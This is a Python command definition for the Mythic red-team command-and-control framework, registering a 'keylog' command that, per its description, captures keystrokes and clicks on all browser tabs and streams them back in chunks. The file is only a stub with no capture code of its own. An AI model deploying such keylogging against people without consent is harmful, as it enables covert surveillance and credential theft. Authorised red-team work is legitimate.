from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments,
    MythicTask, PTTaskMessageAllData,
    PTTaskProcessResponseMessageResponse, CommandAttributes,
)


class KeylogArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class KeylogCommand(CommandBase):
    cmd            = "keylog"
    needs_admin    = False
    help_cmd       = "keylog"
    description    = (
        "Start keystroke and click-event capture on all tabs. "
        "Flushes to Mythic in 200-char chunks. Stop with disable_keylog."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = KeylogArguments
    parameters     = []
    attackmapping  = ["T1056.001"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = ""
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
